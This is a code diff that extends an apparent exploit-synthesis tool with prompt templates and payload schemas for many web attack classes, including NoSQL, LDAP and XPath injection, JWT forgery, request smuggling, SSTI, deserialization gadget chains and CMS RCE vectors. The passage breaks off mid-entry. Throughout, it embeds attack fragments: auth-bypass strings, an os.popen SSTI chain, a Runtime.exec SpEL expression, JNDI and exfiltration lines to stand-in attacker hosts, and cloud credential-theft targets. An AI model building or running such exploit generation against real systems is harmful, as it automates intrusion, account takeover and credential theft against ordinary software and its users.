@@ -1758,34 +1758,736 @@ def _synthesize_exploit_from_intel(
             "defaults": {"redirect_param": "redirect_to", "bypass_technique": "none",
                          "attacker_domain": "https://attacker.example.com"},
         },
+        # ── JavaScript / Node.js ──────────────────────────────────────────────
+        "prototype-pollution": {
+            "analysis": (
+                "Analyze: (1) which object merge/clone/assign function is called on user input "
+                "(_.merge / jQuery.extend / Object.assign / JSON.parse without schema), "
+                "(2) the exact property path that pollutes Object.prototype (__proto__ / constructor.prototype), "
+                "(3) whether the pollution is client-side (DOM) or server-side (Node.js), "
+                "(4) which downstream sink consumes the polluted property (template / spawn / eval), "
+                "(5) gadget chain from pollution to impact (RCE/XSS/auth-bypass)."),
+            "schema": (
+                '  "payload": "<JSON or query-string payload with __proto__ key>",\n'
+                '  "polluted_property": "<property name e.g. isAdmin / outputFunctionName>",\n'
+                '  "polluted_value": "<value that triggers impact>",\n'
+                '  "merge_function": "<_.merge|jQuery.extend|Object.assign|qs.parse|other>",\n'
+                '  "pollution_path": "<__proto__|constructor.prototype|prototype>",\n'
+                '  "impact_sink": "<template render|child_process.spawn|eval|require|other>",\n'
+                '  "attack_surface": "client_side|server_side|both",\n'
+                '  "expected_response_indicator": "<privilege gained / RCE / DOM XSS>",\n'
+            ),
+            "defaults": {"polluted_property": "isAdmin", "polluted_value": "true",
+                         "merge_function": "unknown", "pollution_path": "__proto__",
+                         "attack_surface": "server_side"},
+        },
+        # ── NoSQL / MongoDB ───────────────────────────────────────────────────
+        "nosql-injection": {
+            "analysis": (
+                "Analyze: (1) which MongoDB/Redis/CouchDB operator is injectable "
+                "($where/$gt/$ne/$regex/$in), "
+                "(2) how user input reaches the query without sanitization, "
+                "(3) authentication bypass pattern (username[$ne]=x&password[$ne]=x), "
+                "(4) data exfiltration via $where JS or blind operator enumeration, "
+                "(5) JSON vs query-string vs header as injection vector."),
+            "schema": (
+                '  "payload": "<NoSQL injection payload>",\n'
+                '  "operator": "<$ne|$gt|$where|$regex|$in|$exists>",\n'
+                '  "injection_vector": "json_body|query_string|header",\n'
+                '  "attack_type": "auth_bypass|data_exfil|blind_enum|js_injection",\n'
+                '  "true_payload": "<operator that always returns true>",\n'
+                '  "false_payload": "<operator that always returns false>",\n'
+                '  "expected_response_indicator": "<login success / data in response / response length diff>",\n'
+            ),
+            "defaults": {"operator": "$ne", "injection_vector": "json_body",
+                         "attack_type": "auth_bypass", "true_payload": "", "false_payload": ""},
+        },
+        # ── LDAP ─────────────────────────────────────────────────────────────
+        "ldap-injection": {
+            "analysis": (
+                "Analyze: (1) which LDAP filter is constructed from user input, "
+                "(2) which special characters are unescaped (*)(&)(|)(!))(\\00), "
+                "(3) auth bypass pattern (username=*)(uid=*))(|(uid=*), "
+                "(4) information disclosure via wildcard enumeration, "
+                "(5) OOB exfiltration via LDAP bind to attacker server."),
+            "schema": (
+                '  "payload": "<LDAP injection string>",\n'
+                '  "attack_type": "auth_bypass|info_disclosure|wildcard_enum|oob",\n'
+                '  "filter_escape": "<characters that break the filter>",\n'
+                '  "bypass_string": "<e.g. *)(uid=*))(|(uid=*>",\n'
+                '  "expected_response_indicator": "<auth success / user enumeration / LDAP error>",\n'
+            ),
+            "defaults": {"attack_type": "auth_bypass", "filter_escape": "*)(|",
+                         "bypass_string": "unknown"},
+        },
+        # ── JWT ───────────────────────────────────────────────────────────────
+        "jwt-attack": {
+            "analysis": (
+                "Analyze: (1) which JWT library is used and version, "
+                "(2) is alg:none accepted (no signature verification), "
+                "(3) is the secret weak/default and bruteforceable, "
+                "(4) kid/jku/x5u header injection for key confusion, "
+                "(5) RS256→HS256 algorithm confusion attack possibility, "
+                "(6) claim that grants elevation (role/admin/isAdmin/scope)."),
+            "schema": (
+                '  "payload": "<forged JWT token>",\n'
+                '  "attack_type": "alg_none|weak_secret|kid_injection|jku_injection|algo_confusion",\n'
+                '  "forged_claim": "<claim to forge e.g. role=admin>",\n'
+                '  "header_modification": "<alg:none / kid:../key / jku:https://attacker/>",\n'
+                '  "secret_or_key": "<weak secret if bruteforceable, or key path for kid>",\n'
+                '  "expected_response_indicator": "<admin access / 200 instead of 403>",\n'
+            ),
+            "defaults": {"attack_type": "alg_none", "forged_claim": "unknown",
+                         "header_modification": "alg:none", "secret_or_key": ""},
+        },
+        # ── GraphQL ───────────────────────────────────────────────────────────
+        "graphql-injection": {
+            "analysis": (
+                "Analyze: (1) is introspection enabled and what sensitive types/queries exist, "
+                "(2) which queries/mutations lack authorization checks, "
+                "(3) IDOR via direct object ID in query arguments, "
+                "(4) injection through resolver inputs (SQLi/SSRF inside resolver), "
+                "(5) batch query abuse / query complexity DoS, "
+                "(6) field-level authorization gaps (can subscriber read admin fields)."),
+            "schema": (
+                '  "payload": "<GraphQL query or mutation>",\n'
+                '  "attack_type": "introspection|idor|injection_in_resolver|auth_bypass|batch_abuse",\n'
+                '  "operation": "<query|mutation|subscription>",\n'
+                '  "vulnerable_field": "<type.fieldName>",\n'
+                '  "object_id": "<ID value to test>",\n'
+                '  "expected_response_indicator": "<sensitive data / unauthorized operation success>",\n'
+            ),
+            "defaults": {"attack_type": "introspection", "operation": "query",
+                         "vulnerable_field": "unknown", "object_id": "1"},
+        },
+        # ── Race condition ────────────────────────────────────────────────────
+        "race-condition": {
+            "analysis": (
+                "Analyze: (1) which state-changing operation lacks atomic locking "
+                "(file write / DB update / balance check-then-act), "
+                "(2) the TOCTOU window between check and use, "
+                "(3) how many concurrent requests are needed to win the race, "
+                "(4) the impact (double-spend / privilege grant / coupon reuse / account takeover), "
+                "(5) any mutex/lock mechanism present and how to bypass it."),
+            "schema": (
+                '  "payload": "<single request to repeat concurrently>",\n'
+                '  "race_window": "<check-then-act pair e.g. read balance → deduct>",\n'
+                '  "concurrent_requests": "<number of parallel requests needed>",\n'
+                '  "attack_tool": "<turbo intruder / ffuf race / Go goroutines>",\n'
+                '  "impact": "<double_spend|priv_escalation|coupon_reuse|data_corruption>",\n'
+                '  "expected_response_indicator": "<duplicate success response / balance discrepancy>",\n'
+            ),
+            "defaults": {"race_window": "unknown", "concurrent_requests": "10",
+                         "attack_tool": "turbo intruder", "impact": "unknown"},
+        },
+        # ── Mass Assignment / Parameter Pollution ─────────────────────────────
+        "mass-assignment": {
+            "analysis": (
+                "Analyze: (1) which model/object is hydrated from raw user input "
+                "(Laravel fillable / Rails strong params / PHP array_merge), "
+                "(2) which sensitive field can be mass-assigned (is_admin/role/balance/verified), "
+                "(3) is the field present in $fillable or whitelisted, "
+                "(4) the endpoint and HTTP method that processes the mass assignment, "
+                "(5) how to confirm the assignment (login after / subsequent GET)."),
+            "schema": (
+                '  "payload": "<request body with extra injected field>",\n'
+                '  "injected_field": "<e.g. is_admin=1 or role=admin>",\n'
+                '  "model": "<class/table name>",\n'
+                '  "fillable_bypass": "<field not in $fillable but accepted>",\n'
+                '  "confirmation_request": "<GET request that shows the new value>",\n'
+                '  "expected_response_indicator": "<admin flag set / role changed>",\n'
+            ),
+            "defaults": {"injected_field": "is_admin=1", "model": "unknown",
+                         "fillable_bypass": "unknown"},
+        },
+        # ── Web Cache Poisoning ───────────────────────────────────────────────
+        "cache-poisoning": {
+            "analysis": (
+                "Analyze: (1) which unkeyed input is reflected in cached responses "
+                "(X-Forwarded-Host / X-Forwarded-For / Origin / Vary headers), "
+                "(2) which cache key excludes the injected header, "
+                "(3) how to poison: reflect in body / inject JS / change redirect target, "
+                "(4) cache duration and how to trigger caching, "
+                "(5) web cache deception variant (force sensitive page to cache)."),
+            "schema": (
+                '  "payload": "<HTTP request with poisoning header>",\n'
+                '  "poisoned_header": "<X-Forwarded-Host|X-Forwarded-For|Origin|X-Original-URL>",\n'
+                '  "attack_type": "cache_poisoning|cache_deception|response_splitting",\n'
+                '  "cache_buster": "<unique param to test without poisoning real cache>",\n'
+                '  "reflected_in": "<Location header|body script src|meta refresh>",\n'
+                '  "expected_response_indicator": "<injected host in response / JS loaded from attacker>",\n'
+            ),
+            "defaults": {"poisoned_header": "X-Forwarded-Host", "attack_type": "cache_poisoning",
+                         "cache_buster": "?cb=test123", "reflected_in": "unknown"},
+        },
+        # ── HTTP Request Smuggling ────────────────────────────────────────────
+        "request-smuggling": {
+            "analysis": (
+                "Analyze: (1) CL.TE or TE.CL or TE.TE variant present, "
+                "(2) which front-end/back-end server pair creates the desync, "
+                "(3) how to poison the back-end socket to prepend to next victim's request, "
+                "(4) impact: bypass auth, XSS, cache poisoning, internal header access, "
+                "(5) the exact Content-Length / Transfer-Encoding combination needed."),
+            "schema": (
+                '  "payload": "<raw HTTP request with smuggled body>",\n'
+                '  "variant": "CL.TE|TE.CL|TE.TE|H2.CL|H2.TE",\n'
+                '  "frontend_behavior": "<uses Content-Length>",\n'
+                '  "backend_behavior": "<uses Transfer-Encoding>",\n'
+                '  "smuggled_prefix": "<prepended bytes that poison the next request>",\n'
+                '  "expected_response_indicator": "<timeout / 403 bypass / reflected header>",\n'
+            ),
+            "defaults": {"variant": "CL.TE", "frontend_behavior": "unknown",
+                         "backend_behavior": "unknown"},
+        },
+        # ── Host Header Injection ─────────────────────────────────────────────
+        "host-header-injection": {
+            "analysis": (
+                "Analyze: (1) where the Host/X-Forwarded-Host header value is used "
+                "(password reset link generation / redirect / cache key / SSRF), "
+                "(2) which validation is applied (allowlist / none), "
+                "(3) the attack scenario: poison reset link → account takeover, "
+                "or inject to cause SSRF, or poison cache key, "
+                "(4) which endpoint triggers the vulnerable flow."),
+            "schema": (
+                '  "payload": "<HTTP request with injected Host header>",\n'
+                '  "attack_type": "password_reset_poisoning|ssrf|cache_key_injection|redirect",\n'
+                '  "injected_host": "<attacker.com>",\n'
+                '  "trigger_endpoint": "<endpoint that uses Host in its response>",\n'
+                '  "victim_action": "<click reset link / visit cached page>",\n'
+                '  "expected_response_indicator": "<attacker.com in reset URL / HTTP request to attacker>",\n'
+            ),
+            "defaults": {"attack_type": "password_reset_poisoning", "injected_host": "attacker.com",
+                         "trigger_endpoint": "/wp-login.php?action=lostpassword"},
+        },
+        # ── OAuth / OIDC ──────────────────────────────────────────────────────
+        "oauth-bypass": {
+            "analysis": (
+                "Analyze: (1) which OAuth grant type is used and what state validation is present, "
+                "(2) is the state parameter missing / predictable / reusable (CSRF on OAuth), "
+                "(3) is the redirect_uri validated strictly or bypassable (open redirect in OAuth), "
+                "(4) can the authorization code be leaked via Referer header, "
+                "(5) implicit flow token leakage, "
+                "(6) PKCE code_challenge bypass."),
+            "schema": (
+                '  "payload": "<crafted OAuth URL or token request>",\n'
+                '  "attack_type": "csrf_state|open_redirect_uri|code_leakage|token_leakage|pkce_bypass",\n'
+                '  "grant_type": "authorization_code|implicit|client_credentials|device",\n'
+                '  "bypass_technique": "<omit state / wildcard redirect_uri / fragment leak>",\n'
+                '  "attacker_redirect": "<https://attacker.com/callback>",\n'
+                '  "expected_response_indicator": "<auth code in attacker log / account linked>",\n'
+            ),
+            "defaults": {"attack_type": "csrf_state", "grant_type": "authorization_code",
+                         "bypass_technique": "omit state", "attacker_redirect": "https://attacker.example.com/cb"},
+        },
+        # ── WebSocket Hijacking ───────────────────────────────────────────────
+        "websocket-hijacking": {
+            "analysis": (
+                "Analyze: (1) is the WebSocket handshake CSRF-protected (Origin check / token), "
+                "(2) can a cross-origin page initiate a WebSocket connection to the target, "
+                "(3) what sensitive data or actions are exposed over the WebSocket, "
+                "(4) is the connection authenticated only via cookies (SameSite=None?), "
+                "(5) the malicious page HTML that initiates the cross-site connection."),
+            "schema": (
+                '  "payload": "<HTML page that opens cross-origin WebSocket>",\n'
+                '  "attack_type": "cross_site_ws_hijacking|ws_ssrf|message_injection",\n'
+                '  "ws_endpoint": "<wss://target.com/ws or /chat>",\n'
+                '  "origin_check": "none|weak|strict",\n'
+                '  "sensitive_action": "<what the WS exposes: messages / commands / data>",\n'
+                '  "expected_response_indicator": "<sensitive WS message received by attacker page>",\n'
+            ),
+            "defaults": {"attack_type": "cross_site_ws_hijacking", "origin_check": "none",
+                         "ws_endpoint": "unknown"},
+        },
+        # ── XPath Injection ───────────────────────────────────────────────────
+        "xpath-injection": {
+            "analysis": (
+                "Analyze: (1) which XPath query is constructed from user input, "
+                "(2) which special characters break the query string/double-quote context, "
+                "(3) authentication bypass pattern ('' or '1'='1), "
+                "(4) blind extraction via string-length()/substring() boolean inference, "
+                "(5) OOB extraction via doc() or error-based techniques."),
+            "schema": (
+                '  "payload": "<XPath injection string>",\n'
+                '  "attack_type": "auth_bypass|blind_extraction|error_based",\n'
+                '  "quote_context": "single|double",\n'
+                '  "true_payload": "<payload that always matches>",\n'
+                '  "false_payload": "<payload that never matches>",\n'
+                '  "expected_response_indicator": "<auth success / response length diff>",\n'
+            ),
+            "defaults": {"attack_type": "auth_bypass", "quote_context": "single",
+                         "true_payload": "", "false_payload": ""},
+        },
+        # ── Email Header Injection ─────────────────────────────────────────────
+        "email-header-injection": {
+            "analysis": (
+                "Analyze: (1) which email field is built from user input without CRLF sanitization "
+                "(From / To / Subject / CC / BCC), "
+                "(2) the CRLF sequence injected to add headers or body, "
+                "(3) spam relay: add Bcc to attacker, "
+                "(4) account takeover via injecting different To address in password reset."),
+            "schema": (
+                '  "payload": "<input with CRLF injection>",\n'
+                '  "injected_header": "<Bcc: attacker@evil.com>",\n'
+                '  "attack_type": "spam_relay|account_takeover|header_injection",\n'
+                '  "crlf_encoding": "raw|%0d%0a|%0a",\n'
+                '  "expected_response_indicator": "<email delivered to attacker address>",\n'
+            ),
+            "defaults": {"attack_type": "spam_relay", "crlf_encoding": "%0d%0a",
+                         "injected_header": "Bcc: attacker@evil.com"},
+        },
+        # ── Business Logic ────────────────────────────────────────────────────
+        "business-logic": {
+            "analysis": (
+                "Analyze: (1) which business rule is enforced only client-side or inconsistently, "
+                "(2) can a negative/zero/overflow value bypass a price or quantity check, "
+                "(3) workflow step skipping (checkout without payment / coupon double-use), "
+                "(4) role/permission assumption (access step 3 of a multi-step flow directly), "
+                "(5) the exact sequence of requests that breaks the invariant."),
+            "schema": (
+                '  "payload": "<manipulated request that breaks business logic>",\n'
+                '  "logic_flaw": "price_manipulation|negative_quantity|step_skip|coupon_reuse|race",\n'
+                '  "manipulated_field": "<field name and normal vs exploit value>",\n'
+                '  "step_sequence": ["<step1 normal>", "<step2 manipulated>", "<step3 profit>"],\n'
+                '  "expected_response_indicator": "<order at $0 / coupon applied twice / step accepted>",\n'
+            ),
+            "defaults": {"logic_flaw": "unknown", "manipulated_field": "unknown"},
+        },
+        # ── CRLF / HTTP Response Splitting ────────────────────────────────────
+        "crlf-injection": {
+            "analysis": (
+                "Analyze: (1) where the CRLF sequence reaches an HTTP response header "
+                "(Location / Set-Cookie / custom header), "
+                "(2) which URL parameter or input is reflected in headers without sanitization, "
+                "(3) how to inject a second HTTP response to deliver XSS, "
+                "(4) cookie injection to set attacker-controlled session."),
+            "schema": (
+                '  "payload": "<URL with CRLF-encoded injection>",\n'
+                '  "injected_header": "<Set-Cookie: session=attacker>",\n'
+                '  "crlf_encoding": "%0d%0a|%0a|\\r\\n",\n'
+                '  "attack_type": "xss_via_response_split|cookie_injection|header_injection",\n'
+                '  "expected_response_indicator": "<injected header in response / XSS triggered>",\n'
+            ),
+            "defaults": {"crlf_encoding": "%0d%0a", "attack_type": "header_injection",
+                         "injected_header": "unknown"},
+        },
+        # ── WordPress REST API (tech-specific) ────────────────────────────────
+        "wp-rest-api": {
+            "analysis": (
+                "Analyze: (1) which REST route is registered via register_rest_route() and what "
+                "permission_callback it uses (is it __return_true / missing / weak), "
+                "(2) which request parameters ($request->get_param()) are unsanitized, "
+                "(3) whether subscriber authentication is enough to access the endpoint, "
+                "(4) which nonce or capability check is bypassable, "
+                "(5) the wp-json namespace and route path."),
+            "schema": (
+                '  "payload": "<curl/HTTP request to WP REST endpoint>",\n'
+                '  "rest_route": "</wp-json/namespace/v1/endpoint>",\n'
+                '  "permission_callback": "<__return_true|missing|weak_cap_check>",\n'
+                '  "attack_type": "auth_bypass|sqli_in_resolver|idor|data_exposure|privesc",\n'
+                '  "min_auth": "unauthenticated|subscriber|contributor",\n'
+                '  "nonce_bypass": "<omit nonce / obtain from public page / none needed>",\n'
+                '  "expected_response_indicator": "<sensitive data / unauthorized operation>",\n'
+            ),
+            "defaults": {"permission_callback": "unknown", "attack_type": "auth_bypass",
+                         "min_auth": "unauthenticated", "nonce_bypass": "none"},
+        },
+        # ── Shortcode / Widget injection (WordPress) ──────────────────────────
+        "wp-shortcode": {
+            "analysis": (
+                "Analyze: (1) which shortcode is registered via add_shortcode() and what "
+                "it renders / executes, "
+                "(2) can a low-privilege user (subscriber/contributor) insert shortcodes, "
+                "(3) is the shortcode attribute value sanitized before use in SQL/file/eval, "
+                "(4) stored XSS via shortcode output, "
+                "(5) the exact shortcode syntax needed to trigger the vulnerability."),
+            "schema": (
+                '  "payload": "<[shortcode_name attr=\\"value\\"]>",\n'
+                '  "shortcode_name": "<registered shortcode tag>",\n'
+                '  "vulnerable_attribute": "<attribute name>",\n'
+                '  "attack_type": "stored_xss|sqli|lfi|rce|ssrf",\n'
+                '  "min_role": "subscriber|contributor|author|editor",\n'
+                '  "trigger_condition": "<admin visits page / cron runs / any page load>",\n'
+                '  "expected_response_indicator": "<alert fired / data exfiltrated>",\n'
+            ),
+            "defaults": {"shortcode_name": "unknown", "vulnerable_attribute": "unknown",
+                         "attack_type": "stored_xss", "min_role": "contributor"},
+        },
+        # ── Python / Django / Flask ───────────────────────────────────────────
+        "python-ssti": {
+            "analysis": (
+                "Analyze: (1) which Python template engine is used (Jinja2/Mako/Chameleon/Tornado), "
+                "(2) where user input is passed directly to render_template_string() or env.from_string(), "
+                "(3) which Jinja2 sandbox escape applies (config/__class__/__mro__/__subclasses__), "
+                "(4) the Python class chain to reach os.popen or subprocess, "
+                "(5) Flask vs Django context variables accessible from the template."),
+            "schema": (
+                '  "payload": "<Jinja2/Mako SSTI payload>",\n'
+                '  "template_engine": "jinja2|mako|tornado|chameleon|django_template",\n'
+                '  "escape_chain": "<{{config.__class__.__init__.__globals__[os].popen(id).read()}} or similar>",\n'
+                '  "sandbox_escape": "<__class__.__mro__|__subclasses__|lipsum|config>",\n'
+                '  "rce_command": "<OS command to execute>",\n'
+                '  "expected_response_indicator": "<uid output / file content / 500 error with trace>",\n'
+            ),
+            "defaults": {"template_engine": "jinja2", "sandbox_escape": "__class__.__mro__",
+                         "rce_command": "id"},
+        },
+        "python-deserialization": {
+            "analysis": (
+                "Analyze: (1) which Python deserialization function is called (pickle.loads / "
+                "yaml.load without Loader / shelve / jsonpickle / marshal), "
+                "(2) can user-controlled bytes/string reach the deserializer, "
+                "(3) the __reduce__ method to inject OS command execution, "
+                "(4) YAML !!python/object/apply:os.system gadget, "
+                "(5) base64-encoded pickle payload construction."),
+            "schema": (
+                '  "payload": "<base64-encoded pickle or YAML payload>",\n'
+                '  "deserializer": "pickle|yaml_load|jsonpickle|shelve|marshal",\n'
+                '  "gadget": "<os.system|subprocess.Popen|exec|eval>",\n'
+                '  "command": "<OS command>",\n'
+                '  "encoding": "base64|raw|hex",\n'
+                '  "expected_response_indicator": "<command output / callback to attacker>",\n'
+            ),
+            "defaults": {"deserializer": "pickle", "gadget": "os.system",
+                         "command": "id", "encoding": "base64"},
+        },
+        # ── Java / Spring / Struts ────────────────────────────────────────────
+        "java-deserialization": {
+            "analysis": (
+                "Analyze: (1) which Java deserialization endpoint exists "
+                "(ObjectInputStream.readObject / XStream / Jackson / Kryo / Hessian), "
+                "(2) which ysoserial gadget chain applies (CommonsCollections / Spring / ROME), "
+                "(3) the Content-Type that triggers deserialization "
+                "(application/x-java-serialized-object / text/xml), "
+                "(4) JNDI injection via Log4j/LDAP endpoint (CVE-2021-44228 pattern), "
+                "(5) the exact endpoint that deserializes."),
+            "schema": (
+                '  "payload": "<base64 serialized Java object or JNDI string>",\n'
+                '  "deserializer": "ObjectInputStream|XStream|Jackson|Kryo|Hessian|Log4j_JNDI",\n'
+                '  "gadget_chain": "CommonsCollections1|CommonsCollections6|Spring1|ROME|Groovy1",\n'
+                '  "content_type": "<application/x-java-serialized-object>",\n'
+                '  "jndi_url": "<ldap://attacker.com/exploit or rmi://>",\n'
+                '  "expected_response_indicator": "<callback / RCE output / exception>",\n'
+            ),
+            "defaults": {"deserializer": "ObjectInputStream", "gadget_chain": "CommonsCollections6",
+                         "content_type": "application/x-java-serialized-object"},
+        },
+        "spring-spel": {
+            "analysis": (
+                "Analyze: (1) where user input reaches a Spring Expression Language parser "
+                "(SpelExpressionParser / @Value / @Query / template literals), "
+                "(2) the SpEL expression syntax to execute Java code "
+                "(T(java.lang.Runtime).getRuntime().exec()), "
+                "(3) which endpoint accepts the expression (search / filter / query param), "
+                "(4) response reflection or blind timing to confirm RCE."),
+            "schema": (
+                '  "payload": "<SpEL expression in HTTP parameter>",\n'
+                '  "spel_expression": "<T(java.lang.Runtime).getRuntime().exec(new String[]{...})>",\n'
+                '  "injection_point": "<@Query / @Value / template / search field>",\n'
+                '  "command": "<OS command array>",\n'
+                '  "expected_response_indicator": "<expression result in response / exception>",\n'
+            ),
+            "defaults": {"injection_point": "unknown", "command": "id"},
+        },
+        # ── Ruby / Rails ──────────────────────────────────────────────────────
+        "ruby-deserialization": {
+            "analysis": (
+                "Analyze: (1) which Rails deserialization sink is called "
+                "(Marshal.load / YAML.load / JSON.parse without schema / Oj.load), "
+                "(2) which Rails gadget chain triggers RCE via ERB / Gem::Requirement / ActiveSupport, "
+                "(3) the Cookie Store secret_key_base exposure that enables session forgery, "
+                "(4) the base64+gzip format of a Rails serialized session, "
+                "(5) which endpoint accepts the malicious cookie or parameter."),
+            "schema": (
+                '  "payload": "<base64/Marshal/YAML payload>",\n'
+                '  "sink": "Marshal.load|YAML.load|Oj.load|JSON.parse",\n'
+                '  "gadget": "ERB|Gem::Requirement|ActiveSupport::Deprecation|DRb::DRbObject",\n'
+                '  "secret_key_base": "<leaked or default key if known>",\n'
+                '  "command": "<OS command>",\n'
+                '  "expected_response_indicator": "<RCE output / server error / callback>",\n'
+            ),
+            "defaults": {"sink": "YAML.load", "gadget": "ERB",
+                         "secret_key_base": "", "command": "id"},
+        },
+        "rails-mass-assignment": {
+            "analysis": (
+                "Analyze: (1) which ActiveRecord model is updated with unfiltered params "
+                "(params.require / strong_parameters missing permit), "
+                "(2) which sensitive attribute can be mass-assigned (admin/role/locked/confirmed_at), "
+                "(3) the endpoint (PATCH /users/:id) and HTTP body format, "
+                "(4) nested attributes attack vector (user[role]=admin)."),
+            "schema": (
+                '  "payload": "<PATCH request with injected attribute>",\n'
+                '  "model": "<Rails model name>",\n'
+                '  "injected_attribute": "<e.g. admin=true or role=superadmin>",\n'
+                '  "missing_permit": "<attribute not in .permit() list>",\n'
+                '  "expected_response_indicator": "<admin flag set / privilege confirmed>",\n'
+            ),
+            "defaults": {"model": "User", "injected_attribute": "admin=true",
+                         "missing_permit": "unknown"},
+        },
+        # ── PHP / Laravel ─────────────────────────────────────────────────────
+        "laravel-deserialization": {
+            "analysis": (
+                "Analyze: (1) which Laravel component deserializes user input "
+                "(unserialize / Cookie encryption with exposed APP_KEY / Queue jobs), "
+                "(2) the Laravel gadget chain via Illuminate\\Broadcasting\\PendingBroadcast, "
+                "(3) is the APP_KEY leaked (env file / .git / phpinfo), "
+                "(4) the signed cookie format (base64 + HMAC-SHA256), "
+                "(5) which endpoint sets/reads the malicious cookie."),
+            "schema": (
+                '  "payload": "<forged Laravel encrypted cookie or serialized param>",\n'
+                '  "app_key": "<leaked APP_KEY or empty>",\n'
+                '  "gadget_chain": "PendingBroadcast|GuzzleHttp|Monolog|League\\\\Flysystem",\n'
+                '  "command": "<OS command to execute>",\n'
+                '  "expected_response_indicator": "<RCE output / server error>",\n'
+            ),
+            "defaults": {"app_key": "", "gadget_chain": "PendingBroadcast", "command": "id"},
+        },
+        "php-object-injection": {
+            "analysis": (
+                "Analyze: (1) which PHP class is available in scope when unserialize() is called, "
+                "(2) which magic method (__wakeup/__destruct/__toString/__call/__invoke) "
+                "contains a dangerous operation (file_put_contents/eval/system/include), "
+                "(3) the POP chain to reach the sink from the deserialized object, "
+                "(4) the serialized PHP object string format for the payload, "
+                "(5) any type juggling that enables reaching the vulnerable class."),
+            "schema": (
+                '  "payload": "<PHP serialized object string O:4:\\"Name\\":1:{...}>",\n'
+                '  "entry_class": "<class passed to unserialize>",\n'
+                '  "magic_method": "__wakeup|__destruct|__toString|__call|__invoke",\n'
+                '  "pop_chain": "<ClassA::__destruct → ClassB::__call → eval>",\n'
+                '  "sink": "eval|system|exec|file_put_contents|include|require",\n'
+                '  "expected_response_indicator": "<RCE output / file created / error>",\n'
+            ),
+            "defaults": {"magic_method": "__destruct", "sink": "system", "pop_chain": "unknown"},
+        },
+        # ── Node.js / Express ─────────────────────────────────────────────────
+        "node-rce": {
+            "analysis": (
+                "Analyze: (1) which Node.js function executes user input "
+                "(eval/Function/vm.runInNewContext/child_process.exec/template literals), "
+                "(2) which npm package vulnerability leads to code execution "
+                "(lodash merge → prototype pollution → RCE / ejs template → SSTI), "
+                "(3) the require() injection if module name is user-controlled, "
+                "(4) the exact payload format and HTTP parameter."),
+            "schema": (
+                '  "payload": "<HTTP request triggering Node.js RCE>",\n'
+                '  "sink": "eval|Function|vm.runInNewContext|child_process.exec|ejs_render",\n'
+                '  "npm_gadget": "<e.g. ejs outputFunctionName via prototype pollution>",\n'
+                '  "command": "<OS command>",\n'
+                '  "expected_response_indicator": "<uid output / DNS callback / exception stack>",\n'
+            ),
+            "defaults": {"sink": "eval", "npm_gadget": "unknown", "command": "id"},
+        },
+        # ── Drupal ────────────────────────────────────────────────────────────
+        "drupal-rce": {
+            "analysis": (
+                "Analyze: (1) which Drupal RCE vector is applicable "
+                "(Drupalgeddon2: form_id AJAX / SA-CORE-2018-002 pattern), "
+                "(2) which render array key (#lazy_builder/#post_render/#access_callback) "
+                "allows PHP callback execution, "
+                "(3) authentication requirement (SA-CORE-2018-002 is unauth), "
+                "(4) the exact endpoint and POST body, "
+                "(5) which Drupal version range is affected."),
+            "schema": (
+                '  "payload": "<HTTP POST to /user/register or /?q=user/password>",\n'
+                '  "vector": "drupalgeddon2|sa_core_2019_003|form_callback|services_rest",\n'
+                '  "render_key": "<#lazy_builder|#post_render|#access_callback>",\n'
+                '  "callback_function": "<exec|system|passthru>",\n'
+                '  "command": "<OS command>",\n'
+                '  "expected_response_indicator": "<uid output in response HTML>",\n'
+            ),
+            "defaults": {"vector": "drupalgeddon2", "render_key": "#lazy_builder",
+                         "callback_function": "exec", "command": "id"},
+        },
+        # ── Joomla ────────────────────────────────────────────────────────────
+        "joomla-rce": {
+            "analysis": (
+                "Analyze: (1) which Joomla component or plugin is vulnerable, "
+                "(2) which Joomla-specific vector applies "
+                "(com_fields object injection / com_media upload / com_ajax JSONP), "
+                "(3) authentication requirement and privilege level, "
+                "(4) the exact endpoint format (/index.php?option=com_X&task=Y), "
+                "(5) any token/CSRF bypass needed."),
+            "schema": (
+                '  "payload": "<HTTP request to Joomla component>",\n'
+                '  "component": "<com_fields|com_media|com_ajax|com_users|custom>",\n'
+                '  "vector": "object_injection|file_upload|sqli|ssrf|rce",\n'
+                '  "task": "<task parameter value>",\n'
+                '  "min_auth": "unauthenticated|registered|manager|admin",\n'
+                '  "expected_response_indicator": "<data/file/command output>",\n'
+            ),
+            "defaults": {"component": "com_fields", "vector": "object_injection",
+                         "min_auth": "unauthenticated"},
+        },
+        # ── .NET / ASP.NET ────────────────────────────────────────────────────
+        "dotnet-deserialization": {
+            "analysis": (
+                "Analyze: (1) which .NET deserializer is used "
+                "(BinaryFormatter/XmlSerializer/DataContractSerializer/JSON.NET TypeNameHandling/ViewState), "
+                "(2) the ysoserial.net gadget chain applicable "
+                "(ActivitySurrogateSelectorFromFile / TextFormattingRunProperties / ClaimsPrincipal), "
+                "(3) is ViewState MAC validation disabled / key leaked, "
+                "(4) the endpoint that accepts the serialized data, "
+                "(5) the Content-Type or parameter name."),
+            "schema": (
+                '  "payload": "<base64/hex encoded .NET serialized object>",\n'
+                '  "deserializer": "BinaryFormatter|XmlSerializer|JSON.NET|ViewState|DataContractSerializer",\n'
+                '  "gadget": "ActivitySurrogateSelector|TextFormattingRunProperties|ClaimsPrincipal",\n'
+                '  "viewstate_key": "<leaked machineKey or empty>",\n'
+                '  "command": "<OS command>",\n'
+                '  "expected_response_indicator": "<RCE output / server error 500>",\n'
+            ),
+            "defaults": {"deserializer": "BinaryFormatter",
+                         "gadget": "TextFormattingRunProperties",
+                         "viewstate_key": "", "command": "whoami"},
+        },
+        # ── Android / Mobile ─────────────────────────────────────────────────
+        "android-deeplink": {
+            "analysis": (
+                "Analyze: (1) which Activity/Intent filter accepts deep links without validation, "
+                "(2) can the deep link data be crafted to trigger XSS in a WebView, "
+                "(3) intent parameter injection to access unexported components, "
+                "(4) file:// or javascript: scheme handling in WebView, "
+                "(5) the malicious URI scheme and parameters."),
+            "schema": (
+                '  "payload": "<malicious deep link URI>",\n'
+                '  "uri_scheme": "<app://|myapp://|https://>",\n'
+                '  "attack_type": "webview_xss|intent_injection|file_access|js_scheme",\n'
+                '  "vulnerable_activity": "<Activity class name>",\n'
+                '  "expected_response_indicator": "<XSS alert / file read / component access>",\n'
+            ),
+            "defaults": {"attack_type": "webview_xss", "vulnerable_activity": "unknown"},
+        },
+        # ── Kubernetes / Cloud ────────────────────────────────────────────────
+        "k8s-ssrf": {
+            "analysis": (
+                "Analyze: (1) which internal Kubernetes API server endpoint is reachable via SSRF, "
+                "(2) the service account token auto-mounted at /run/secrets/kubernetes.io/serviceaccount/, "
+                "(3) IMDS endpoint for cloud credential theft "
